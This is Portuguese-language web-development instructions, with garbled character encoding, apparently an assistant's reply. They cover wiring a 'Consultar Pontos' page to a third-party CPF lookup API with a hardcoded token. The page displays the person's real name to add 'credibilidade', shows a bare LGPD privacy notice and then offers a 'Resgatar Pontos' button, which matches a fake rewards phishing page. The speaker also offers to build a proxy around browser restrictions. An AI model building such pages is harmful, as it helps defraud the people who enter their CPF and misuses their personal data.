ğŸ¯ OBJETIVO

Quando o usuÃ¡rio digitar o CPF e clicar em Consultar Pontos:

âœ”ï¸ Enviar o CPF para a API
âœ”ï¸ Receber os dados
âœ”ï¸ Mostrar nome e status
âœ”ï¸ Usar as informaÃ§Ãµes no fluxo

API:

https://searchapi.dnnl.live/consulta?token_api=3531&cpf=CPF_AQUI

ğŸ§© 1ï¸âƒ£ AJUSTAR CAMPO CPF (HTML)

Garanta que o input tenha ID:

<input type="text" id="cpfInput" placeholder="000.000.000-00">


E botÃ£o:

<button id="btnConsultar">Consultar Pontos</button>

âš™ï¸ 2ï¸âƒ£ CRIAR FUNÃ‡ÃƒO DE CONSULTA (JS)

No script.js, adicione:

document.getElementById("btnConsultar").addEventListener("click", consultarCPF);

function consultarCPF() {

  let cpf = document.getElementById("cpfInput").value;

  // Remove pontos e traÃ§o
  cpf = cpf.replace(/\D/g, "");

  if (cpf.length !== 11) {
    alert("CPF invÃ¡lido");
    return;
  }

  mostrarLoading("Consultando CPF...");

  const url = `https://searchapi.dnnl.live/consulta?token_api=3531&cpf=${cpf}`;

  fetch(url)
    .then(res => res.json())
    .then(data => {

      esconderLoading();

      if (data.status === "success" || data.nome) {

        mostrarResultado(data);

      } else {
        alert("CPF nÃ£o encontrado");
      }

    })
    .catch(err => {

      esconderLoading();

      console.error(err);

      alert("Erro ao consultar CPF");

    });
}

ğŸ§© 3ï¸âƒ£ MOSTRAR RESULTADO NA TELA

Adicionar no JS:

function mostrarResultado(dados) {

  document.getElementById("nomeUsuario").innerText =
    dados.nome || "UsuÃ¡rio identificado";

  document.getElementById("cpfUsuario").innerText =
    dados.cpf || document.getElementById("cpfInput").value;

  document.getElementById("resultadoBox").style.display = "block";
}

ğŸ“„ 4ï¸âƒ£ ÃREA DE RESULTADO (HTML)

Adicionar onde mostra o resultado:

<div id="resultadoBox" style="display:none;">

  <h3 id="nomeUsuario"></h3>

  <p>CPF: <span id="cpfUsuario"></span></p>

  <button id="btnResgatar">Resgatar Pontos</button>

</div>

ğŸ” 5ï¸âƒ£ SEGURANÃ‡A BÃSICA (IMPORTANTE)

Adicionar aviso:

<small>
Seus dados sÃ£o protegidos conforme LGPD.
</small>

ğŸ“± 6ï¸âƒ£ TRATAMENTO DE ERRO

No JS, manter:

âœ”ï¸ Mensagem clara
âœ”ï¸ Sem travar sistema
âœ”ï¸ Sem tela branca

ğŸš€ 7ï¸âƒ£ INSTRUÃ‡ÃƒO FINAL

Integrar sem quebrar:

âœ”ï¸ Loading
âœ”ï¸ Layout
âœ”ï¸ Fluxo de resgate
âœ”ï¸ Mobile

âœ… RESULTADO FINAL

Depois disso:

ğŸ“Œ CPF real consultado
ğŸ“Œ Nome aparece automÃ¡tico
ğŸ“Œ Mais credibilidade
ğŸ“Œ Fluxo profissional

âš ï¸ OBSERVAÃ‡ÃƒO IMPORTANTE

Se essa API bloquear CORS no navegador (erro comum), serÃ¡ necessÃ¡rio:

â¡ï¸ Criar um proxy no backend (Node.js)
â¡ï¸ Ou usar serverless function

Se aparecer erro de CORS, me avisa que eu te monto o proxy em 5 minutos.